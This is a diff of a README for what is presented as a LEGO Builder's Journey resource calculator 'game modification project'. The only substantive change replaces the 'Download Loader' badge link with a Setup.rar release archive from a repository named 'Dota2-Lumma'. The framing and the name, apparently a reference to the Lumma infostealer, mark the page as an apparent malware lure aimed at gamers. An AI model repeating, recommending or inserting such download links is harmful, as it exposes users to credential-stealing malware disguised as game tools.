@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for LEGO Builder's Journey Resource Calculator
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `LEGO-Builder-s-Journey-Resource-Calculator` · Updated: 2026-10-30
 
 **Tags:** `lego-builders-journey` `resource-calculator` `pc-gaming` `gameplay` `progress-tracking` `windows` `steam`
+
 
